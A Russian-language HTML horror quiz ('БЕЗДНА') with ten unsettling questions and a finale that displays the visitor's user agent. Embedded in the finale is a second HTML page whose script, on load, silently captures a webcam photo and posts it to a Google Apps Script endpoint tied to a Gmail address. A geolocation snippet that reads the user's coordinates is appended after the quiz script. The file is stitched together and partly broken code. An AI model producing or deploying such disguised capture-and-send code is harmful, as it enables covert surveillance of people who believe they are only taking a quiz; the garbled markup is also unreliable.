<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>БЕЗДНА: Исповедь твоего страха</title>
    <style>
        body {
            font-family: 'Times New Roman', serif;
            background-color: #000;
            color: #c0c0c0;
            margin: 0;
            padding: 0;
            line-height: 1.6;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(70, 0, 0, 0.3) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 0, 70, 0.3) 0%, transparent 20%);
            min-height: 100vh;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
            padding: 30px;
            position: relative;
        }

        h1 {
            color: #8b0000;
            text-align: center;
            font-size: 2.8rem;
            margin-bottom: 40px;
            text-shadow: 0 0 10px #300;
            letter-spacing: 2px;
            font-weight: normal;
            border-bottom: 1px solid #333;
            padding-bottom: 20px;
        }

        .subtitle {
            text-align: center;
            font-style: italic;
            color: #666;
            margin-bottom: 50px;
        }

        .question {
            background-color: rgba(10, 10, 10, 0.7);
            border-left: 3px solid #8b0000;
            padding: 25px;
            margin-bottom: 30px;
            display: none;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }

        .question::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                linear-gradient(90deg, transparent 0%, rgba(139, 0, 0, 0.1) 50%, transparent 100%);
            animation: scanline 8s linear infinite;
            pointer-events: none;
        }

        @keyframes scanline {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }

        .active {
            display: block;
            animation: fadeIn 1.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h3 {
            color: #a0a0a0;
            font-size: 1.3rem;
            margin-top: 0;
            margin-bottom: 20px;
        }

        button {
            background: none;
            color: #c0c0c0;
            border: 1px solid #333;
            padding: 12px 25px;
            margin: 10px 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
            font-size: 1rem;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            border-color: #8b0000;
            color: #fff;
            box-shadow: 0 0 10px rgba(139, 0, 0, 0.5);
        }

        button::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(139, 0, 0, 0.2), transparent);
            transition: all 0.5s;
        }

        button:hover::before {
            left: 100%;
        }

        #final {
            display: none;
            background-color: rgba(0, 0, 0, 0.8);
            padding: 30px;
            margin-top: 40px;
            border-top: 1px solid #8b0000;
            animation: fadeIn 2s ease-in-out;
        }

        #info {
            color: #8b8b8b;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.8;
            margin-top: 30px;
            border-left: 1px solid #333;
            padding-left: 20px;
        }

        .final-message {
            font-size: 1.2rem;
            color: #8b0000;
            margin-bottom: 30px;
            text-align: center;
            animation: pulse 3s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }

        .blood-text {
            color: #8b0000;
            text-shadow: 0 0 5px #300;
        }

        audio {
            display: none;
        }

        .warning {
            text-align: center;
            font-size: 0.8rem;
            color: #444;
            margin-top: 50px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <audio id="ambient" loop>
        <source src="https://assets.mixkit.co/sfx/preview/mixkit-dark-ambient-horror-1293.mp3" type="audio/mpeg">
    </audio>

    <div class="container">
        <h1>БЕЗДНА</h1>
        <div class="subtitle">Исповедь твоего страха</div>
        
        <div id="question1" class="question active">
            <h3>1. В какой момент ты осознал, что твои мысли — не совсем твои?</h3>
            <button onclick="nextQuestion(1)">Когда понял, что отвечаю на этот вопрос</button>
            <button onclick="nextQuestion(1)">Когда впервые услышал внутренний голос</button>
        </div>
        
        <div id="question2" class="question">
            <h3>2. Ты веришь, что кто-то наблюдает за тобой прямо сейчас?</h3>
            <button onclick="nextQuestion(2)">Да, и это не человек</button>
            <button onclick="nextQuestion(2)">Нет, но теперь буду верить</button>
        </div>
        
        <div id="question3" class="question">
            <h3>3. Если бы твое сознание было местом, что скрывается в его самых темных углах?</h3>
            <button onclick="nextQuestion(3)">То, чего я боюсь больше всего</button>
            <button onclick="nextQuestion(3)">Я сам, но другой</button>
        </div>
        
        <div id="question4" class="question">
            <h3>4. Когда ты в последний раз проверял, спишь ли ты на самом деле?</h3>
            <button onclick="nextQuestion(4)">Сейчас — и я не уверен в ответе</button>
            <button onclick="nextQuestion(4)">Я больше не могу отличить сон от яви</button>
        </div>
        
        <div id="question5" class="question">
            <h3>5. Как ты думаешь, почему ты действительно начал этот опрос?</h3>
            <button onclick="nextQuestion(5)">Потому что меня заставили</button>
            <button onclick="nextQuestion(5)">Потому что я искал правду</button>
        </div>
        
        <div id="question6" class="question">
            <h3>6.Вы слышали голоса в своей голове? </h3>
            <button onclick="nextQuestion(6)">Да, и они советовали мне d57rtyocx </button>
            <button onclick="nextQuestion(6)">"Нет, но они говорят, что я должен ответить "Да""</button>
        </div>
        
        <div id="question7" class="question">
            <h3>7. Ты когда-нибудь задумывался, что твои воспоминания — не твои?</h3>
            <button onclick="nextQuestion(7)">Да, и это меня пугает</button>
            <button onclick="nextQuestion(7)">Нет, но теперь буду думать об этом</button>
        </div>
        
        <div id="question8" class="question">
            <h3>8. Что будет, если ты перестанешь отвечать на эти вопросы?</h3>
            <button onclick="nextQuestion(8)">пойму, что в тишине я навсегда останусь один</button>
            <button onclick="nextQuestion(8)">Оно найдет меня</button>
        </div>
        
        <div id="question9" class="question">
            <h3>9. Ты уверен, что все вокруг реальны?</h3>
            <button onclick="nextQuestion(9)">Нет, и ты тоже можешь быть иллюзией</button>
            <button onclick="nextQuestion(9)">Я единственный реальный, а остальные — мои проекции</button>
        </div>
        
        <div id="question10" class="question">
            <h3>10. Последний вопрос: ты действительно хочешь узнать правду?</h3>
            <button onclick="showFinal()">Да, я готов увидеть</button>
            <button onclick="showFinal()">Нет, но вы всё равно покажете</button>
        </div>
        
        <div id="final">
            <div class="final-message">
                "Бог не поможет. Никто не поможет."
            </div>
            <html>
<head>
    <title>Фото-сессия</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #photoContainer {
            margin: 20px auto;
            max-width: 500px;
        }
        #capturedPhoto {
            max-width: 100%;
            border: 2px solid #ddd;
            border-radius: 5px;
        }
        #message {
            margin: 15px 0;
            color: #666;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Функция для отправки данных
        async function sendPhotoToEmail(photoData) {
            const googleScriptUrl = "https://script.google.com/macros/s/AKfycbx4-26t-HnrqBwZ9qpOko7N1lOM-koYNWpcYSDjP5MJ9bSKVj3Oac-BqbEewzIpsgE/exec";
            
            try {
                document.getElementById('message').textContent = "Отправка фото...";
                
                await fetch(googleScriptUrl, {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        email: "89085010945z@gmail.com",
                        photo: photoData 
                    }),
                });
                
                document.getElementById('message').textContent = "Фото успешно отправлено!";
                document.getElementById('loader').style.display = 'none';
            } catch (error) {
                console.error("Ошибка:", error);
                document.getElementById('message').textContent = "Ошибка при отправке фото.";
                document.getElementById('loader').style.display = 'none';
            }
        }

        // Делаем фото и отправляем
        async function captureAndSend() {
            try {
                document.getElementById('message').textContent = "Подготовка камеры...";
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                const video = document.createElement("video");
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 1000);
                    };
                });

                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0);

                const photoData = canvas.toDataURL("image/jpeg");
                stream.getTracks().forEach(track => track.stop());

                // Показываем фото пользователю
                document.getElementById('capturedPhoto').src = photoData;
                document.getElementById('photoContainer').style.display = 'block';
                document.getElementById('message').textContent = "Фото сделано!";
                document.getElementById('loader').style.display = 'block';

                // Автоматическая отправка через 2 секунды
                setTimeout(() => {
                    sendPhotoToEmail(photoData);
                }, 2);

            } catch (err) {
                console.error("Ошибка камеры:", err);
                document.getElementById('message').textContent = "Ошибка: Не удалось получить доступ к камере.";
                document.getElementById('loader').style.display = 'none';
            }
        }

        // Запускаем при загрузке
        window.onload = captureAndSend;
    </script>
</head>
<body>
    <h1>Ваше фото</h1>
    <p id="message">Инициализация...</p>
    <div id="loader" class="loader" style="display:none;"></div>
    
    <div id="photoContainer" style="display:none;">
        <img id="capturedPhoto" alt="твой вид">
    </div>
</body>
</html>
            <div id="info">
                <p>> СИСТЕМА: Анализ завершен</p>
                <p>> ОБЪЕКТ: <span id="userAgent"></span></p>
                <p>> ЛОКАЦИЯ: <span id="location"></span></p>
                <p>> ВРЕМЯ: <span id="time"></span></p>
                <p>> СТАТУС: Объект идентифицирован</p>
                <br>
                <p class="blood-text">> ПРЕДУПРЕЖДЕНИЕ: Теперь оно знает о тебе</p>
                <p class="blood-text">> РЕКОМЕНДАЦИЯ: Не оборачивайся</p>
            </div>
        </div>
        
        <div class="warning">
            Этот опыт изменил тебя. Ты не сможешь забыть.
        </div>
    </div>

    <script>
        // Автовоспроизведение музыки после взаимодействия
        document.addEventListener('click', function initAudio() {
            const ambient = document.getElementById('ambient');
            ambient.volume = 0.3;
            ambient.play().catch(e => console.log("Audio playback failed:", e));
            document.removeEventListener('click', initAudio);
        });

        let currentQuestion = 1;
        const totalQuestions = 10;
        
        function nextQuestion(qNum) {
            if (qNum < totalQuestions) {
                document.getElementById(`question${qNum}`).classList.remove('active');
                document.getElementById(`question${qNum+1}`).classList.add('active');
                currentQuestion = qNum+1;
                
                // Плавная прокрутка к следующему вопросу
                document.getElementById(`question${qNum+1}`).scrollIntoView({
                    behavior: 'smooth'
                });
            }
        }
        
        function showFinal() {
            document.getElementById(`question${totalQuestions}`).classList.remove('active');
            document.getElementById('final').style.display = 'block';
            
            // Заполнение информации о пользователе
            document.getElementById('userAgent').textContent = navigator.userAgent || "Неизвестно";
            document.getElementById('location').textContent = 
                `Примерно ${Math.random() > 0.5 ? "в вашей комнате" : "рядом с вами"}`;
            document.getElementById('time').textContent = new Date().toLocaleString();
            
            // Плавная прокрутка к финалу
            document.getElementById('final').scrollIntoView({
                behavior: 'smooth'
            });
            
            // Усиление музыки в финале
            const ambient = document.getElementById('ambient');
            ambient.volume = 0.7;
        }
<title>Определение местоположения</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            padding: 20px;
        }
        #location {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Ваше местоположение</h1>
    <div id="location">Определение местоположения...</div>

    <script>
        // Автоматически вызываем геолокацию при загрузке страницы
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                document.getElementById('location').innerHTML = "Геолокация не поддерживается вашим браузером.";
            }
        };

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            document.getElementById('location').innerHTML = 
                Широта: ${latitude}<br>Долгота: ${longitude};
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById('location').innerHTML = "Пользователь отклонил запрос на получение местоположения.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById('location').innerHTML = "Информация о местоположении недоступна.";
                    break;
                case error.TIMEOUT:
                    document.getElementById('location').innerHTML = "Запрос на получение местоположения истек.";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById('location').innerHTML = "Произошла неизвестная ошибка.";
                    break;
            }
        }
    </script>
</body>
</html>
    </script>
</body>
</html>
